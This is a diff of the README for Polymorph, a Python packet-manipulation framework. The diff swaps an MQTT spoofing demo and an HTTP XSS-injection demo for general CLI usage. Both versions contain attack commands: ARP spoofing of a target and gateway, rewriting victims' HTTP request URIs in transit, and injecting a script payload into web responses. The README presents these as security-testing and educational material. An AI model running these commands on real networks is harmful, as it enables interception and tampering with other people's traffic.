@@ -5,7 +5,7 @@ Polymorph is a framework written in Python 3 that allows the modification of net
 
 # Installation
 
-## Download and installation on Linux (Recommended)
+## Download and installation on Linux
 
 Polymorph is specially designed to be installed and run on a Linux operating system, such as Kali Linux. Before installing the framework, the following requirements must be installed:
 
@@ -44,124 +44,95 @@ For examples and documentation please refer to:
 
 ## Using the Phcli
 
-### Modifying packets that implement the MQTT protocol
+### Dissecting almost any network protocol
+Let's start by seeing how Polymorph dissects the fields of different network protocols, it will be useful to refer to them if we want to modify any of this fields in real time. **You can try any protocol that comes to your mind.**
 
-Let's see how to use the Polymorph command line interface to spoof the communication between two machines and modify MQTT protocol.
-
- - Let's start by seeing how the Polymorph framework dissects the MQTT Publish packet.
+ - HTTP protocol, show only the HTTP layer and the fields belonging to it.
 ```
-# phcli -p mqtt --show-fields --in-pkt test_topic
-
-[INFO] Waiting for a network packet which implements the MQTT protocol
-[INFO] The packet will be dissected to show its fields
-[OK] Sniffing process started. Waiting for packets...
-[OK] Packet captured. Printing the fields...
-
----[ RAW.MQTT ]---
-str hdrflags          = 0 (0x00000030)
-int msgtype           = 48 (3)
-int dupflag           = 48 (0)
-int qos               = 48 (0)
-int retain            = 48 (0)
-int len               = 24 (24)
-int topic_len         = 10 (10)
-str topic             = test_topic (test_topic)
-str msg               = test_message (test_message)
+# phcli --protocol http --show-fields
 ```
-
- - Now that we know how polymorph dissects the MQTT Publish packets and how it names the fields, we are going to modify the `msg` field by spoofing the two remote machines that communicate using MQTT.
-
+- Show the full HTTP packet and the fields belonging to it.
 ```
-# phcli -s arp -tg 192.168.1.102 -g 192.168.1.121 -p mqtt -f msg -v "new_value" --in-pkt "test_topic"
-
-[OK] ARP spoofing started between 192.168.1.121 and 192.168.1.102
-[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
-[INFO] It will be in sniffing mode until you generate the packet
-[OK] Sniffing mode started. Waiting for packets...
-[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
-[OK] Process of interception and modification of packets in real time started.
-[*] Waiting for packets...
-
-(Press Ctrl-C to exit)
-
-###[ IP ]### 
-  version   = 4
-  ihl       = 5
-  tos       = 0x0
-  len       = 75
-  id        = 28767
-  flags     = DF
-  frag      = 0
-  ttl       = 63
-  proto     = tcp
-  chksum    = 0x471e
-  src       = 192.168.1.102
-  dst       = 192.168.1.121
-  \options   \
-###[ TCP ]### 
-     sport     = 49198
-     dport     = 1883
-     seq       = 4046645883
-     ack       = 938260113
-     dataofs   = 8
-     reserved  = 0
-     flags     = PA
-     window    = 229
-     chksum    = 0x7526
-     urgptr    = 0
-     options   = [('NOP', None), ('NOP', None), ('Timestamp', (3643906, 1823353))]
-###[ Raw ]### 
-        load      = '0\x16\x00\ntest_topicnew_value'
+# phcli --protocol http --show-packet
+```
+You can also apply filters on network packets, for example, you can indicate that only those containing a certain string or number are displayed.
+```
+# phcli -p dns --show-fields --in-pkt "phrack"
+```
+```
+# phcli -p icmp --show-packet --in-pkt "84" --type "int"
+```
+- You can also concatenate filters.
+```
+# phcli -p http --show-packet --in-pkt "phrack;GET;issues"
+```
+```
+# phcli -p icmp --show-packet --in-pkt "012345;84" --type "str;int"
+```
+- You can filter by the name of the fields that the protocol contains, but bear in mind that this name is the one that Polymorph provides when it dissects the network packet.
+```
+# phcli -p icmp --show-packet --field "chksum"
+```
+- You can also concatenate fields.
+```
+# phcli -p mqtt --show-packet --field "topic;msg"
 ```
 
-### Modifying packets that implement the HTTP protocol
+### Modifying network packets in real time
+Now that we know the Polymorph representation of the network packet that we want to modify, we will see how to modify it in real time.
 
-Let's see a last example modifying HTTP packets in localhost to inject a simple XSS. After executing the command simply navigate with your browser through an HTTP page.
+Let's start with some examples. **All the filters explained during the previous section can also be applied here**. 
+- This will just modify a packet that contains the strings `/issues/40/1.html` and `POST` by inserting in the `request_uri` field the value `/issues/61/1.html`. So when the user visit http://phrack.org/issues/40/1.html the browser will visit http://phrack.org/issues/61/1.html
 ```
-# phcli -p tcp --in-pkt "</html>" -b "\-54:\-20" -v '"><script>alert("hacked")</script>' -ipt "iptables -A INPUT -j NFQUEUE --queue-num 1"
-
-[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
-[INFO] It will be in sniffing mode until you generate the packet
-[OK] Sniffing mode started. Waiting for packets...
-[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
-[OK] Process of interception and modification of packets in real time started.
-[*] Waiting for packets...
-
-(Press Ctrl-C to exit)
-
-###[ IP ]### 
-  version   = 4
-  ihl       = 5
-  tos       = 0x0
-  len       = 898
-  id        = 9382
-  flags     = DF
-  frag      = 0
-  ttl       = 54
-  proto     = tcp
-  chksum    = 0xef66
-  src       = 194.150.169.131
-  dst       = 192.168.0.167
-  \options   \
-###[ TCP ]### 
-     sport     = http
-     dport     = 52210
-     seq       = 3481765999
-     ack       = 2589984605
-     dataofs   = 8
-     reserved  = 0
-     flags     = PA
-     window    = 2049
-     chksum    = 0x3df4
-     urgptr    = 0
-     options   = [('NOP', None), ('NOP', None), ('Timestamp', (4180691237, 3065344385))]
-###[ Raw ]### 
-        load      = 'm Mongo\n10.  Elite World News by Dr. Dude\n11.  Elite World News by Dr. Dude\n\n\nComing soon...\n\n                                 Phrack Jolt!\n\n                       All the VMBs and TWICE the c0deZ!\n_______________________________________________________________________________\n</pre>\n\n</div>\n</div>\n\n</center>\n\n<div align="center" class="texto-2-bold">\n[ <a href="../../index.html" title="News">News</a> ]\n[ <a href="../../papers/dotnet_instrumentation.html" title="Paper Feed">Paper Feed</a> ]\n[ <a href="../../issues/69/1.html" title="Issues">Issues</a> ]\n[ <a href="../../authors.html" title="Authors">Authors</a> ]\n[ <a href="../../archives/" title="Archives">Archives</a> ]\n[ <a href="../../contact.html" title="Contact">Contact</a> ]\n</div>\n\n<div align="right" class="texto-1">\xc2\xa9 Copyl"><script>alert("hacked")</script>iv>\n</body>\n</html>\n'
+# phcli -p http --field "request_uri" --value "/issues/61/1.html" --in-pkt "/issues/40/1.html;POST"
 ```
+- The previous command will work if we are in the middle of the communication between a machine and the gateway. Probably the user wants to establish himself in the middle, for this he can use arp spoofing.
+```
+# phcli --spoof arp --target 192.168.1.20 --gateway 192.168.1.1 -p http -f "request_uri" -v "/issues/61/1.html" --in-pkt "/issues/40/1.html;POST"
+```
+- Or maybe the user wants to try it on localhost, for that he only has to modify the iptables rule that Polymorph establishes by default.
+```
+# phcli -p http -f "request_uri" -v "/issues/61/1.html" --in-pkt "/issues/40/1.html;POST" -ipt "iptables -A OUTPUT -j NFQUEUE --queue-num 1"
+```
+It may be the case that the user wants to modify a set of bytes of a network packet that have not been interpreted as a field by Polymorph. For this you can directly access the packet bytes using a slice. (*Remember to add the *iptables* rule if you try it in localhost*)
+```
+# phcli -p icmp --bytes "50:55" --value "hello" --in-pkt "012345"
+```
+```
+# phcli -p icmp -b "\-6:\-1" --value "hello" --in-pkt "012345"
+```
+```
+# phcli -p tcp -b "\-54:\-20" -v '"><script>alert("hacked")</script>' --in-pkt "</html>"
+```
+
+### Adding complex processing in real time
+
+In certain situations it is possible that the PHCLI options are not enough to perform a certain action. For this, the framework implements the concept of conditional functions, which are functions written in Python that will be executed on the network packet that is intercepted in real time.
+- The Conditional functions have the following format:
+```
+def precondition(packet):
+    # Processing on the packet intercepted in real time
+    return packet
+```
+- As a simple example, we are going to screen the raw bytes of the packets that we intercept. (*Remember to add the *iptables* rule if you try it in localhost*)
+```
+def execution(packet):
+    print(packet.get_payload())
+    return None
+```
+```
+# phcli -p icmp --executions execution.py -v "None"
+```
+For more information about the power of the conditional functions, refer to:
+-   [English whitepaper](https://github.com/shramos/polymorph/blob/master/doc/whitepaper/whitepaper_english.pdf)
+-   [Spanish whitepaper](https://github.com/shramos/polymorph/blob/master/doc/whitepaper/whitepaper_spanish.pdf)
 
 # Release Notes
 [release-notes-1.0.0](https://github.com/shramos/polymorph/blob/master/doc/release-notes/release-notes-1.0.0.md)\
 [release-notes-1.0.3](https://github.com/shramos/polymorph/blob/master/doc/release-notes/release-notes-1.0.3.md)
+
+# Disclaimer
+This program is published with the aim of being used for educational purposes and to help improve the security of the systems. I am not responsible for the misuse of this project.
 
 # Contact
 
